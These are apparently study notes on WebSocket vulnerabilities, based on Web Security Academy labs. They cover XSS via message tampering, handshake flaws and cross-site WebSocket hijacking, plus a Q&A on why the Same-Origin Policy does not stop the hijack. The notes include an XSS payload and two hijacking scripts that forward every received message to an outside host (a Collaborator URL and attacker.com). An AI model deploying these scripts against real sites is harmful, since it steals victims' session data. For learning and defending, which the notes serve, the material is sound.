- **Basic data Manipulating WebSocket messages to exploit vulnerabilities**,
- **Manipulating the WebSocket handshake to exploit vulnerabilities**,
- **Cross-site WebSockets Hijack (CSRF)**, `Important` CSWH doesn't obey to `SOP` which make it vulnerable to CORS attacks so we can connect to websocket then read response data.

---
### Manipulating WebSocket messages to exploit vulnerabilities

The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by [tampering with the contents of WebSocket messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages).

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

```json
{ "message":"Hello Carlos" }
```

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

```html
<td>Hello Carlos</td>
```

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

```json
{ "message":"<img src=1 onerror='alert(1)'>" }
```

---
### Manipulating the WebSocket handshake to exploit vulnerabilities

Some WebSockets vulnerabilities can only be found and exploited by [manipulating the WebSocket handshake](https://portswigger.net/web-security/websockets#manipulating-websocket-connections). These vulnerabilities tend to involve design flaws, such as:

- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.
---
### Using cross-site WebSockets to exploit vulnerabilities

Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a [WebSocket handshake](https://portswigger.net/web-security/websockets/what-are-websockets#how-are-websocket-connections-established). It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.
#### What is the impact of cross-site WebSocket hijacking?
- **Perform unauthorized actions masquerading as the victim user.** As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.
- **Retrieve sensitive data that the user can access.** Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.
#### Performing a cross-site WebSocket hijacking attack

Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the [normal conditions for CSRF attacks](https://portswigger.net/web-security/csrf#how-does-csrf-work), you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:
```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```


> [!NOTE]
> The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.


If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:

- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
- Sending WebSocket messages to retrieve sensitive data.
- Sometimes, just waiting for incoming messages to arrive containing sensitive data.

```html
<script>
	var ws = new WebSocket('wss://0ae8005303cec9b782e656ff00680029.web-security-academy.net/chat');
	ws.onmessage = function(event) {
	  // SOP doesn't stop this!
	  // We 'hear' the message and immediately send it to our server.
	  fetch('https://5ekku0mrz90qazv9rj7iji3pegk78ywn.oastify.com/log?data=' + btoa(event.data));
	};
	ws.onopen = function() {
	  ws.send("READY");
	};
</script>
```

> [!Question] 
> why Cross-site WebSocket hijacking doesn't obey to SOP. i can execute javascript commands that connect to websocket then i can send back the response data to me

This is one of the most interesting "quirks" of web security. You are right: normally, the **Same-Origin Policy (SOP)** prevents `attacker.com` from reading data from `bank.com`. However, WebSockets were designed before modern cross-origin protections were standardized, and they operate under a different set of rules.

Here is exactly why CSWH bypasses the SOP and how you are able to exfiltrate data.

#### 1. SOP Does Not Apply to WebSocket Handshakes

The Same-Origin Policy was designed specifically for **HTTP responses** (like HTML, JSON, or XML). It prevents a script from reading the body of a cross-origin HTTP response.
However, a WebSocket connection is not a standard HTTP request/response cycle. It is an **Upgrade**.
- **The Loophole:** Browsers allow scripts to initiate a WebSocket connection to **any** origin. The SOP only restricts _reading_ HTTP responses; it does not restrict _establishing_ a WebSocket connection.
#### 2. The "Stateful Pipe" vs. "Stateless Request"
In a normal `fetch()` request (SOP active):
1. Script sends request.
2. Server sends response.
3. Browser checks: "Is the script allowed to read this?" (No -> Block).
In a WebSocket Hijack:
4. Script sends a "Handshake" (Upgrade request).
5. The browser automatically includes the victim's **Cookies**.
6. The server sees the cookies and says: "Welcome back, Victim! Let's open a permanent chat line."
7. **The Upgrade happens.** At this point, the connection is no longer HTTP; it is a raw TCP-like stream.
#### 3. There is no "Read" Protection for Events
Once that "pipe" is open, the SOP is completely out of the picture.
- In the WebSocket API, when the server sends data, the browser triggers the `onmessage` event.
- There is **no mechanism** in the browser that checks the origin of a WebSocket message once the connection is established. If the connection is open, your script is allowed to "hear" everything the server sends over that connection.
#### 4. How you exfiltrate the data
Because your script has a reference to the `socket` object, it can simply "listen" for data and send it to your own server (like Burp Collaborator).
JavaScript

```js
var ws = new WebSocket('wss://vulnerable-lab.net/chat');

ws.onmessage = function(event) {
    // SOP doesn't stop this!
    // We 'hear' the message and immediately send it to our server.
    fetch('https://attacker.com/log?data=' + btoa(event.data));
};

ws.onopen = function() {
    // We can also 'talk' to the server on behalf of the victim
    ws.send("READY");
};
```

#### Why doesn't the server stop this?

The only way a server can prevent this is by checking the **`Origin` header** during the initial HTTP handshake.

When your script initiates the connection, the browser is honest and sends:

Origin: https://exploit-server.net

If the server is lazy and only checks the `Cookie` but ignores the `Origin`, it will allow the connection. This is the "Hijack."
